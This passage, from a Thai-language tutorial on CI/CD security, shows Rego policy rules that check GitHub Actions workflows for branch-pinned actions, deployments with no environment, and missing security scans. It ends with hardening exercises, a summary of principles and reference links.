    regex.match("@(main|master|latest|HEAD)", uses)
    
    msg := sprintf("Step '%v' ใช้ branch reference — ควรใช้ SHA หรือ version tag", [uses])
}

# กฎ: deployment jobs ต้องมี environment กำหนด
deny[msg] {
    job := input.workflow.jobs[job_name]
    
    # ตรวจสอบว่า job ทำ deployment
    step := job.steps[_]
    regex.match("deploy|kubectl apply|helm upgrade", step.run)
    
    # แต่ไม่มี environment กำหนด
    not job.environment
    
    msg := sprintf("Job '%v' ทำ deployment แต่ไม่มี environment กำหนด", [job_name])
}

# กฎ: ต้องมี security scan ใน pipeline
warn[msg] {
    jobs := {name | input.workflow.jobs[name]}
    
    # ตรวจว่ามี security scan job
    not any_security_scan
    
    msg := "Pipeline ไม่มี security scan job"
}

any_security_scan {
    job := input.workflow.jobs[_]
    step := job.steps[_]
    
    security_actions := {
        "github/codeql-action",
        "semgrep/semgrep-action",
        "aquasecurity/trivy-action",
        "snyk/actions",
    }
    
    some action in security_actions
    startswith(step.uses, action)
}
```

---

## 11. Exercise และ Homework

### Exercise 1: Security Audit ของ Pipeline ของตัวเอง

1. Clone repository ของตัวเองและรัน security check script
2. ระบุ issues ทุกข้อ
3. แก้ไข issues ตามลำดับความสำคัญ
4. รัน check อีกครั้งเพื่อยืนยัน score >= 80

### Exercise 2: Implement OIDC

1. สร้าง AWS OIDC provider สำหรับ GitHub Actions
2. สร้าง IAM Role ด้วย least privilege policy
3. แก้ไข pipeline ให้ใช้ OIDC แทน long-lived credentials
4. ทดสอบว่า deployment ยังทำงานได้

### Exercise 3: Secret Scanning Integration

1. ติดตั้ง pre-commit hooks ด้วย gitleaks
2. สร้าง custom rule สำหรับ project ของตัวเอง
3. เพิ่ม secret scanning ใน CI pipeline
4. ทดสอบโดยพยายาม commit ไฟล์ที่มี test secret

### Exercise 4: Audit Log Dashboard

1. สร้าง structured logging ใน pipeline
2. ส่ง logs ไปที่ Elasticsearch หรือ Loki
3. สร้าง Grafana dashboard แสดง:
   - Pipeline success/failure rate
   - Vulnerability findings over time
   - Deployment frequency

---

## สรุป

ความปลอดภัยใน CI/CD ไม่ใช่แค่เพิ่ม security tools แต่เป็นการเปลี่ยน mindset:

1. **Shift Left Security** — ตรวจสอบความปลอดภัยตั้งแต่ต้น pipeline
2. **Least Privilege** — ให้สิทธิ์เพียงเท่าที่จำเป็น
3. **Immutable Infrastructure** — ไม่แก้ไข production โดยตรง
4. **Everything as Code** — รวมถึง security policies
5. **Continuous Monitoring** — ติดตามทุกการกระทำอย่างต่อเนื่อง

ในตอนต่อไป (Part 52) เราจะเจาะลึกเรื่อง Supply Chain Security และ SLSA Framework

---

## อ้างอิง

- [OWASP Top 10 CI/CD Security Risks](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
- [GitHub Security Hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [SLSA Framework](https://slsa.dev)
- [Sigstore Documentation](https://docs.sigstore.dev)
- [NIST SP 800-204D: Security Strategies for Microservices](https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-204D.pdf)
